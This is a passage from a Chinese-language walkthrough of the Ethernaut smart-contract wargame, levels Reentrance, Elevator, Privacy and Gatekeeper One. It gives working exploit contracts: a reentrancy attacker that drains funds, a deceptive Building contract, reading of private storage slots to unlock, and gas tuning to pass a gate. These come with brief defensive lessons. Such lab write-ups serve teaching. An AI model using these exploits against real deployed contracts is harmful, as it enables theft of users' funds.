<span class="w">  </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">balances</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">donate</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_to</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">].</span><span class="nx">add</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_who</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">balance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_who</span><span class="p">];</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">result</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="nx">_amount</span><span class="p">}(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_amount</span><span class="p">;</span><span class="w">  </span><span class="c1">// does nothing</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">Reentrance</span><span class="w"> </span><span class="nx">reentrance</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">reentrance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Reentrance</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="nx">reentrance</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="mf">125000000000000</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">gasleft</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">6000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">reentrance</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="mf">125000000000000</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>

<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>合约 Hack 部署完成后，进行「捐赠」</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">donate</span><span class="p">(</span><span class="s2">&quot;&lt;hack-address&gt;&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">125000000000000</span><span class="p">});</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">fromWei</span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="s2">&quot;&lt;hack-address&gt;&quot;</span><span class="p">))</span>
<span class="s2">&quot;0.000125&quot;</span>
</code></pre></div>
</li>
<li>
<p>随后开始「盗钱」，务必给足汽油 :)
    &gt; 本次汽油量参考：200,000 | 156,169 (78.08%)</p>
</li>
<li>
<p>不推荐使用 <code>transfer</code> 和 <code>send</code> 来代替 <code>call</code>，可能影响 Istanbul 硬分叉之后的合约（部分指令消耗汽油量增加）</p>
</li>
<li>永远假设转账的接收方是另一个合约，而非普通的地址</li>
</ul>
<h2 id="11-elevator">11. Elevator<a class="headerlink" href="#11-elevator" title="Permanent link">&para;</a></h2>
<p>到达顶层！</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="kr">interface</span><span class="w"> </span><span class="nx">Building</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Elevator</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">top</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">floor</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">goTo</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_floor</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Building</span><span class="w"> </span><span class="nx">building</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Building</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="nx">building</span><span class="p">.</span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">_floor</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// 第一次返回 false</span>
<span class="w">      </span><span class="nx">floor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_floor</span><span class="p">;</span>
<span class="w">      </span><span class="nx">top</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">building</span><span class="p">.</span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">floor</span><span class="p">);</span><span class="w">  </span><span class="c1">// 第二次返回 true</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li><code>Interface</code> 内部不能实现任何函数，但可以继承自其它接口，所有声明的函数必须是外部的，不能声明构造函数和状态变量</li>
<li>「电梯应该在建筑里」，实现这个 <code>Building</code> 合约就好啦 &gt;_&lt;</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Building</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">!</span><span class="nx">flag</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">flag</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Elevator</span><span class="w"> </span><span class="nx">elevator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Elevator</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="nx">elevator</span><span class="p">.</span><span class="nx">goTo</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Elevator</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">top</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">floor</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">goTo</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_floor</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Building</span><span class="w"> </span><span class="nx">building</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Building</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="nx">building</span><span class="p">.</span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">_floor</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">floor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_floor</span><span class="p">;</span>
<span class="w">      </span><span class="nx">top</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">building</span><span class="p">.</span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">floor</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>接口函数可以通过声明 <code>view</code> 来防止状态被篡改，<code>pure</code> 同理</li>
<li>在不改变状态的情况下，可以根据不同的输入数据来返回不同的结果，如 <code>gasleft()</code></li>
</ul>
<h3 id="_7">参考资料<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://solidity-by-example.org/interface/">Interface | Solidity by Example</a></li>
<li><a href="https://docs.soliditylang.org/en/develop/contracts.html#view-functions">View Functions</a></li>
</ul>
<h2 id="12-privacy">12. Privacy<a class="headerlink" href="#12-privacy" title="Permanent link">&para;</a></h2>
<p>解锁！(<a href="#8-vault">Vault</a> 升级版)</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Privacy</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="c1">// slot 0</span>
<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">locked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>

<span class="w">  </span><span class="c1">// slot 1</span>
<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">ID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">;</span><span class="w">  </span><span class="c1">// uint256 is 32 bytes long</span>

<span class="w">  </span><span class="c1">// slot 2</span>
<span class="w">  </span><span class="nx">uint8</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">flattening</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">10</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint8</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">denomination</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">255</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint16</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">awkwardness</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint16</span><span class="p">(</span><span class="nx">now</span><span class="p">);</span>

<span class="w">  </span><span class="c1">// slot 3, 4, 5</span>
<span class="w">  </span><span class="nx">bytes32</span><span class="p">[</span><span class="mf">3</span><span class="p">]</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">data</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">bytes32</span><span class="p">[</span><span class="mf">3</span><span class="p">]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">_data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_data</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">unlock</span><span class="p">(</span><span class="nx">bytes16</span><span class="w"> </span><span class="nx">_key</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">_key</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">bytes16</span><span class="p">(</span><span class="nx">data</span><span class="p">[</span><span class="mf">2</span><span class="p">]));</span>
<span class="w">    </span><span class="nx">locked</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="cm">/*</span>
<span class="cm">    A bunch of super advanced solidity algorithms...</span>

<span class="cm">      ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`</span>
<span class="cm">      .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,</span>
<span class="cm">      *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,---/V\</span>
<span class="cm">      `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)</span>
<span class="cm">      ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU</span>
<span class="cm">  */</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>每个 slot 大小为 32 字节，当邻近变量也能够放进单个 slot 时，将按从右到左的顺序依次放入</li>
<li>常量不存储</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
<span class="s2">&quot;0x0000000000000000000000000000000000000000000000000000000000000001&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span>
<span class="s2">&quot;0x000000000000000000000000000000000000000000000000000000006210d5b1&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">)</span>
<span class="s2">&quot;0x00000000000000000000000000000000000000000000000000000000d5b1ff0a&quot;</span><span class="w"> </span><span class="c1">// 0a for flattening, ff for denomination</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">3</span><span class="p">)</span>
<span class="s2">&quot;0xc3003c2bcb65196b8352fb925d945f9229929bcc727f70ea451255859a6a4f56&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">4</span><span class="p">)</span>
<span class="s2">&quot;0x6d6f76ea288ee9c55ab1ad76264518237a23af3495ee5702f57a164f8aeb99b0&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">5</span><span class="p">)</span>
<span class="s2">&quot;0x06e3eb3b9e34467cbf1a226fc2bd13e5948a7a15ef2205caf186fa3df3076f53&quot;</span><span class="w">  </span><span class="c1">// data[2]</span>
</code></pre></div>
<ul>
<li>
<p>由于 <code>_key</code> 为 <code>bytes16</code> 类型，需要对 <code>data[2]</code> 进行类型转换</p>
<div class="highlight"><pre><span></span><code><span class="c1">// 从 bytes32 到 bytes16，只需要移走右侧的 16 字节，即 32 位十六进制数</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">unlock</span><span class="p">(</span><span class="s2">&quot;0x06e3eb3b9e34467cbf1a226fc2bd13e5&quot;</span><span class="p">)</span>
</code></pre></div>
</li>
</ul>
<h3 id="_8">参考资料<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
<p><a href="https://solidity-by-example.org/hacks/accessing-private-data/">Accessing Private Data | Solidity by Example</a></p>
<h2 id="13-gatekeeper-one">13. Gatekeeper One<a class="headerlink" href="#13-gatekeeper-one" title="Permanent link">&para;</a></h2>
<p>越过守门人并注册为参赛者</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">GatekeeperOne</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">entrant</span><span class="p">;</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateOne</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateTwo</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">gasleft</span><span class="p">()</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">8191</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="c1">// uint64 is 8 bytes long</span>
<span class="w">      </span><span class="c1">// _gateKey % 2^32 == _gateKey % 2^16</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">uint16</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)),</span><span class="w"> </span><span class="s2">&quot;GatekeeperOne: invalid gateThree part one&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="c1">// _gateKey % 2^32 != _gateKey</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;GatekeeperOne: invalid gateThree part two&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="c1">// _gateKey % 2^32 == tx.origin % 2^16</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">uint16</span><span class="p">(</span><span class="nx">uint160</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">)),</span><span class="w"> </span><span class="s2">&quot;GatekeeperOne: invalid gateThree part three&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">enter</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">gateOne</span><span class="w"> </span><span class="nx">gateTwo</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">entrant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>使用与 <a href="#4-telephone">Telephone</a> 相同的方式通过 <code>gateOne</code></li>
<li>
<p>至于 <code>gateTwo</code>，在 Remix 的 JavaScript VM 环境下通过 Debug 来获取具体所需汽油量</p>
<ul>
<li><strong>注意</strong>：不同版本的 EVM 或编译器都会导致不同的汽油消耗量</li>
<li>首先选择一个较大的汽油量，如 <code>90000</code></li>
<li>
<p>执行完成后，进入 <code>DEBUGGER</code>，执行完操作码 <code>GAS</code>，此时剩余的汽油量为 <code>89577</code><br>
<img alt="89577" src="../img/ethernaut04.jpg" /></p>
</li>
<li>
<p>由此可计算出通过 <code>gateTwo</code> 实际需要的最少汽油量：<span class="arithmatex">\(90000-89577+8191\times 3=24996\)</span></p>
<ul>
<li><code>entrant = tx.origin</code> 包含 <code>SSTORE</code> 操作码，因为 <code>entrant</code> 未被写入过，至少需要消耗 20000 汽油</li>
</ul>
</li>
<li>在 Goerli 测试网络中运行时会抛出异常，再次调试，观察栈中出现 <code>0x1fff(8191)</code> 的下一个数字，为 <code>0x60a4(24740)</code>，得出最终需要的汽油量为：<span class="arithmatex">\(24996-24740+8191\times 3=24829\)</span><br>
<img alt="0x60a4" src="../img/ethernaut05.jpg" /></li>
</ul>
</li>
<li>
<p>对于 <code>gateThree</code>，用 <span class="arithmatex">\(A_0A_1...A_7\)</span> 来表示 <code>_gateKey</code> 的各个字节</p>
<ul>
<li><code>part one</code> 需满足 <span class="arithmatex">\(A_4A_5A_6A_7 = A_6A_7\)</span></li>
<li><code>part two</code> 需满足 <span class="arithmatex">\(A_4A_5A_6A_7 \neq A_0A_1...A_7\)</span></li>
<li><code>part three</code> 需满足 <span class="arithmatex">\(A_4A_5A_6A_7 = B_6B_7\)</span> （视作 <code>tx.origin</code> 后两个字节）</li>
<li>也就是说，<code>_gateKey</code> 只需要后两个字节与 <code>tx.origin</code> 一致，倒数三四字节为 <span class="arithmatex">\(0\)</span>，剩下四个字节不为 <span class="arithmatex">\(0\)</span> 就可以了 &gt;v&lt;</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">GatekeeperOne</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">entrant</span><span class="p">;</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateOne</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateTwo</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">gasleft</span><span class="p">()</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">8191</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
